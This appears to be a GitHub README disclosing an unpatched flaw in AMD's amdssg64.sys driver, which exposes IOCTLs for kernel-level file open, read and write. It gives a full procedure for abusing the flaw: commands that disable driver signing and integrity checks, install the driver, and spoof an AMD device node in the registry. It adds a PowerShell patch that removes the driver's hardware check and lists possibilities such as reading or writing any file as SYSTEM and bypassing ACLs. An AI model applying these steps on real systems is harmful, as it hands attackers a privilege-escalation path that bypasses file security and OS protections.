# AMD-SSG-Kernel-File-IO

# Information
This is not a known exploit nor is it patched yet. amdssg64.sys (AMD Radeon SSG / LiquidFlash driver) exposes three IOCTLs that allow usermode applications to perform kernel-level file I/O operations. The driver uses `ZwCreateFile`, `ZwReadFile`, `ZwWriteFile`, and `ZwClose` internally, giving any usermode caller the ability to open, read, write, and close files through Ring 0 — bypassing usermode file access restrictions entirely.

The driver is a WDF (KMDF) PnP driver originally built for AMD's Radeon SSG (Solid State Graphics) PCIe cards featuring onboard flash storage. It was designed to let AMD's usermode software perform direct file I/O through the kernel for high-bandwidth data transfers to the SSG's local storage. However, the IOCTL interface has no access control — any process that can open the device handle can issue file operations as SYSTEM.

**Tested on Windows 10 22H2.** Newer versions of Windows may block loading the driver due to driver signing policy changes.

# Hardware Validation
The driver performs a runtime hardware check (`sub_140001600`) on every file open IOCTL by calling `IoGetDeviceInterfaces` and searching the returned device interface strings for specific AMD PCI device IDs. The following hardware is required:

- **AMD Radeon SSG** — PCI Device ID `DEV_7300` (revision `0xCC`)
- **AMD Radeon Pro** — PCI Device ID `DEV_6862`

These are AMD Radeon Pro / SSG series GPUs with onboard SSD storage. Without one of these cards physically installed (or the check patched out), all file IOCTLs will fail with `STATUS_DEVICE_DOES_NOT_EXIST`.

If you do not have the required hardware, see **Step 4** below to patch the validation out of the driver.

# Amd Website 
```
Driver was obtained in this driver pack from winows 10 64bit
https://www.amd.com/en/support/downloads/drivers.html/graphics/radeon-r9-r7-r5/radeon-r9-200-series/amd-radeon-r9-280.html
```

# How To Use

### Note 
```
Unless you have AMD Radeon SSG or AMD Radeon Pro this exploit wil not work for you.
If your wanting to test if this exploit does work in general. You can follow these steps,
this will not hold up against edr or any av unless
you have the correct PCI Device needed for this driver!
```

### Step 1 — Enable Test Signing
```
bcdedit /set testsigning on
bcdedit /set nointegritychecks on
bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS
shutdown /r /t 0
```

### Step 2 — Install the Driver
After reboot, copy `amdssg64.sys` and create the kernel service:
```
copy amdssg64.sys C:\Windows\System32\drivers\amdssg64.sys
sc create SSG binpath="C:\Windows\System32\drivers\amdssg64.sys" type=kernel
```

### Step 3 — Spoof the AMD SSG Device Node
The driver is a PnP driver — it will only create its device interface when Windows enumerates a matching hardware device. Without an actual AMD Radeon SSG card, you need to create a fake device node in the registry so PnP binds the driver and registers the device interface:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v HardwareID /t REG_MULTI_SZ /d "PCI\VEN_1002&DEV_7300&REV_CC" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Service /t REG_SZ /d "SSG" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v ClassGUID /t REG_SZ /d "{4D36E97D-E325-11CE-BFC1-08002BE10318}" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Class /t REG_SZ /d "System" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Driver /t REG_SZ /d "{4D36E97D-E325-11CE-BFC1-08002BE10318}\9999" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v ConfigFlags /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v DeviceDesc /t REG_SZ /d "AMD Radeon SSG" /f
```

Reboot after adding the registry entries:
```
shutdown /r /t 0
```

### Step 4 — Patch Hardware Validation (No AMD SSG Hardware)
If you do not have an AMD Radeon SSG (`DEV_7300`) or Radeon Pro (`DEV_6862`) GPU, the driver's runtime hardware check will reject all file IOCTLs. Patch `sub_140001600` to always return 1 (hardware found):

**Make sure the driver service is stopped/deleted first:**
```
sc delete SSG
shutdown /r /t 0
```

**After reboot, patch the driver in PowerShell (admin):**
```powershell
$file = "C:\Windows\System32\drivers\amdssg64.sys"
$bytes = [System.IO.File]::ReadAllBytes($file)
$e_lfanew = [BitConverter]::ToInt32($bytes, 0x3C)
$optHdrSize = [BitConverter]::ToInt16($bytes, $e_lfanew + 20)
$secTable = $e_lfanew + 24 + $optHdrSize
$secVA = [BitConverter]::ToInt32($bytes, $secTable + 12)
$secRaw = [BitConverter]::ToInt32($bytes, $secTable + 20)
$offset = $secRaw + (0x1600 - $secVA)
$bytes[$offset] = 0xB0; $bytes[$offset+1] = 0x01; $bytes[$offset+2] = 0xC3
[System.IO.File]::WriteAllBytes($file, $bytes)
Write-Host "Patched sub_140001600 -> mov al, 1; ret at offset 0x$($offset.ToString('X'))"
```

**Recreate the service and start:**
```
sc create SSG binpath="C:\Windows\System32\drivers\amdssg64.sys" type=kernel
sc start SSG
```

### Step 5 — Verify
Confirm the device interface is registered:
```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceClasses\{EBD5EFC4-27AD-4CD0-AC13-6279ED7DB699}"
```

### Step 6 — Run
Compile the project and run the executable. The output should show a valid device handle and successful file I/O operations.

# Driver Details

**Driver:** amdssg64.sys v1.0.2016.05106 (Built June 15, 2018)

**Device Interface GUID:** `{EBD5EFC4-27AD-4CD0-AC13-6279ED7DB699}`

**Hardware Requirement:** AMD Radeon SSG — PCI `DEV_7300` (rev `0xCC`) or `DEV_6862`

# amdssg64.sys

**IOCTL Dispatch (EvtIoDeviceControl)**
```
switch ( a5 )
{
  case 0x222828:                                // Open File
    if ( !v8 || !v10 || a4 != 576 || !v11 || a3 != 640 )
      goto LABEL_25;
    result = BuildFile(v8, v10, v11);
    goto LABEL_23;
  case 0x222830:                                // Close File
    if ( !v8 || !v10 || a4 != 64 || !v11 || a3 != 128 )
      goto LABEL_25;
    result = CloseFile(v8);
    goto LABEL_23;
  case 0x222834:                                // Read/Write File
    if ( v8 && v10 && a4 == 64 && v11 && a3 == 128 )
    {
      result = ReadWriteFile(v8, a2, v10, v11);
      goto LABEL_23;
    }
    goto LABEL_25;
}
```

**BuildFile — ZwCreateFile Wrapper (IOCTL 0x222828)**
```
RtlInitUnicodeString(&DestinationString, L"\\??\\");
RtlInitUnicodeString(&Source, v4 + 4);
RtlAppendUnicodeStringToString(&Destination, &DestinationString);
RtlAppendUnicodeStringToString(&Destination, &Source);

v6 = ZwCreateFile(
       &FileHandle,
       v13,                    // ACCESS_MASK from input flags
       &ObjectAttributes,
       &IoStatusBlock,
       &AllocationSize,
       0x80u,                  // FILE_ATTRIBUTE_NORMAL
       0,
       CreateDisposition,      // FILE_OPEN or FILE_OPEN_IF
       0x48u,
       0LL,
       0);
```

**ReadWriteFile — ZwReadFile/ZwWriteFile (IOCTL 0x222834)**
```
if ( *(_DWORD *)(a3 + 8) == 1 )
  v13 = ZwReadFile(v12, 0LL, ApcRoutine, v11, IoStatusBlock, Buffer, Length, &ByteOffset, 0LL);
else
  v13 = ZwWriteFile(v12, 0LL, ApcRoutine, v11, IoStatusBlock, Buffer, Length, &ByteOffset, 0LL);
```

**Hardware Validation (sub_140001600)**
```
IoGetDeviceInterfaces(&InterfaceClassGuid, 0LL, 0, &SymbolicLinkList);
// Searches for DEV_7300 (rev CC) and DEV_6862 in device interface strings
wcscpy(SubStr, L"DEV_");
ultow_s(v5, &SubStr[4], 5uLL, 16);
v8 = wcsstr(v1, SubStr);
```

**Process Cleanup (NotifyRoutine)**
```
// Registered via PsSetCreateProcessNotifyRoutine
// On process exit: walks linked list, closes all kernel handles owned by that PID
if ( (HANDLE)*(v7 - 2) == ProcessId )
{
  // Unlink from list
  v11 = (void *)v8[2];
  if ( v11 )
    ZwClose(v11);
}
```

# Possibilities
- Read/write any file on disk as SYSTEM from usermode
- Bypass ACLs and file security descriptors
- Access locked/in-use files through kernel handles
- Async I/O via APC completion routines
